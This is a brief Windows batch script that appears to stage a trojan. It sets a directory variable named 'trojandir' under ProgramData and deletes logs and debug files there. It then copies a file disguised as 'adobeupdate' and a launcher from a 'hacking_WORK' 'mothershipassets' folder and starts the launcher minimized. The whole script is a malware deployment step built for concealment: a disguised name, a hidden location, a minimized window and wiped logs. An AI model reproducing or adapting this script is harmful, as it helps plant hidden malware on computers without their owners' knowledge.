set trojandir=C:\ProgramData\owd
cd /d %trojandir%

del /f /q debug_test_*
del /f /q *.log
del /f /q adobeupdate
del /f /q *_running

copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate .
copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\launch.cmd .
start "" /min launch.cmd